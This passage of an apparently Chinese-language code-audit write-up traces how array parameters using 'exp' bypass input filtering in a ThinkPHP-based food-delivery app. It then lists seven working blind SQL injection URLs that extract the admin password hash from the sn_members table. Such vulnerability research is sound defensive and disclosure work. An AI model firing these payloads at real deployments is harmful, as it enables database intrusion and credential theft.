                         }
                         $whereStr .= implode(' OR ',$str);
                     }elseif(strpos($key,'&')){
                         $array =  explode('&',$key);
                         $str   =  array();
                         foreach ($array as $m=>$k){
                             $v =  $multi?$val[$m]:$val;
                             $str[]   = '('.$this->parseWhereItem($this->parseKey($k),$v).')';
                         }
                         $whereStr .= implode(' AND ',$str);
                     }else{
                         $whereStr .= $this->parseWhereItem($this->parseKey($key),$val);
                     }
                 }
                 $whereStr .= ' )'.$operate;
             }
             $whereStr = substr($whereStr,0,-strlen($operate));
         }
         return empty($whereStr)?'':' WHERE '.$whereStr;
     }
而parseWhere函数调用在update、delete和parseSql函数中。parseSql是一个替换SQL语句中关键字的函数：
        public function parseSql($sql,$options=array()){
         $sql   = str_replace(
             array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%COMMENT%'),
             array(
                 $this->parseTable($options['table']),
                 $this->parseDistinct(isset($options['distinct'])?$options['distinct']:false),
                 $this->parseField(!empty($options['field'])?$options['field']:'*'),
                 $this->parseJoin(!empty($options['join'])?$options['join']:''),
                 $this->parseWhere(!empty($options['where'])?$options['where']:''),
                 $this->parseGroup(!empty($options['group'])?$options['group']:''),
                 $this->parseHaving(!empty($options['having'])?$options['having']:''),
                 $this->parseOrder(!empty($options['order'])?$options['order']:''),
                 $this->parseLimit(!empty($options['limit'])?$options['limit']:''),
                 $this->parseUnion(!empty($options['union'])?$options['union']:''),
                 $this->parseComment(!empty($options['comment'])?$options['comment']:'')
             ),$sql);
         return $sql;
     }
当查询语句是where类型的查询时，parseWhere会传入参数，生成where查询语句。再继续向上跟进调用parseSql函数的地方buildSelectSql：
        public function buildSelectSql($options=array()) {
         if(isset($options['page'])) {
             // 根据页数计算limit
             if(strpos($options['page'],',')) {
                 list($page,$listRows) =  explode(',',$options['page']);
             }else{
                 $page = $options['page'];
             }
             $page    =  $page?$page:1;
             $listRows=  isset($listRows)?$listRows:(is_numeric($options['limit'])?$options['limit']:20);
             $offset  =  $listRows*((int)$page-1);
             $options['limit'] =  $offset.','.$listRows;
         }
         if(C('DB_SQL_BUILD_CACHE')) { // SQL创建缓存
             $key    =  md5(serialize($options));
             $value  =  S($key);
             if(false !== $value) {
                 return $value;
             }
         }
         $sql  =   $this->parseSql($this->selectSql,$options);
         $sql .= $this->parseLock(isset($options['lock'])?$options['lock']:false);
         if(isset($key)) { // 写入SQL创建缓存
             S($key,$sql,array('expire'=>0,'length'=>C('DB_SQL_BUILD_LENGTH'),'queue'=>C('DB_SQL_BUILD_QUEUE')));
         }
         return $sql;
     }
buildSelectSql函数向上跟进，在select函数中：
        public function select($options=array()) {
         $this->model  =   $options['model'];
         $sql    = $this->buildSelectSql($options);
         $cache  =  isset($options['cache'])?$options['cache']:false;
         if($cache) { // 查询缓存检测
             $key    =  is_string($cache['key'])?$cache['key']:md5($sql);
             $value  =  S($key,'',$cache);
             if(false !== $value) {
                 return $value;
             }
         }
         $result   = $this->query($sql,$this->parseBind(!empty($options['bind'])?$options['bind']:array()));
         if($cache && false !== $result ) { // 查询缓存写入
             S($key,$result,$cache);
         }
         return $result;
     }
select最终调用在find函数中：
        public function find($options=array()) {
         if(is_numeric($options) || is_string($options)) {
             $where[$this->getPk()]  =   $options;
             $options                =   array();
             $options['where']       =   $where;
         }
         // 总是查找一条记录
         $options['limit']   =   1;
         // 分析表达式
         $options            =   $this->_parseOptions($options);
         $resultSet          =   $this->db->select($options);
         if(false === $resultSet) {
             return false;
         }
         if(empty($resultSet)) {// 查询结果为空
             return null;
         }
         $this->data         =   $resultSet[0];
         $this->_after_find($this->data,$options);
         if(!empty($this->options['result'])) {
             return $this->returnResult($this->data,$this->options['result']);
         }
         return $this->data;
     }
因此只要在查询过程中调用find函数的，并且按照最初的分析构造传入一个数组，最终会绕过过滤函数执行SQL语句。  
全局搜下find()函数，还是挺多的：
整个SQL的调用栈应该是这样的：
# **0x03 复现**
分析完调用过程开始构造poc，以product模块为例，需要传递一个id的数组，这里用val[0] == 'exp', val[1] ==
payload这种方式构造，得出的完整url应该是这样的：  
[http://localhost:8888/waimai-master/index.php?m=product&a=index&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/index.php?m=product&a=index&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)
这里需要注意，我们想构造的最后的查询语句应该是这样的：  
SELECT * FROM `sn_article` WHERE ( (`aid` in ('XX'))/**/or substr((select
userpass from sn_members where uid=1),1,1)='9') -- ) ) LIMIT 1
所以需要两个右括号，第一个闭合WHERE中的第一个条件(`aid` in ('XX'))，第二个闭合WHERE。用户为admin，密码md5第一位是9。
下面开始测试
存在此处SQL问题的还有很多：  
1、[http://localhost:8888/waimai-master/index.php?m=product&a=index&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/index.php?m=product&a=index&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)  
2、[http://localhost:8888/waimai-master/index.php?m=product&a=index&id[0]=in%20(%27xx%27))/*&id[1]=*/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27%20--%20&id[2]=exp](http://localhost:8888/waimai-master/index.php?m=product&a=index&id\[0\]=in%20\(%27xx%27\)\)/*&id\[1\]=*/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27%20--%20&id\[2\]=exp)  
3、[http://localhost:8888/waimai-master/index.php?m=article&a=s&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/index.php?m=article&a=s&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)  
4、[http://localhost:8888/waimai-master/admin.php?&m=food&a=edit&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/admin.php?&m=food&a=edit&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)  
5、[http://localhost:8888/waimai-master/admin.php?&m=foodcat&a=edit&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/admin.php?&m=foodcat&a=edit&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)  
6、[http://localhost:8888/waimai-master/admin.php?&m=order&a=detail&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/admin.php?&m=order&a=detail&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)  
7、[http://localhost:8888/waimai-master/admin.php?&m=order&a=orderfour&id[0]=exp&id[1]=in%20(%27XX%27))/**/or%20substr((select%20userpass%20from%20sn_members%20where%20uid=1),1,1)=%279%27)%20--+](http://localhost:8888/waimai-master/admin.php?&m=order&a=orderfour&id\[0\]=exp&id\[1\]=in%20\(%27XX%27\)\)/**/or%20substr\(\(select%20userpass%20from%20sn_members%20where%20uid=1\),1,1\)=%279%27\)%20--+)
# **0x04 总结**
参考：  
提前给师傅们拜年了~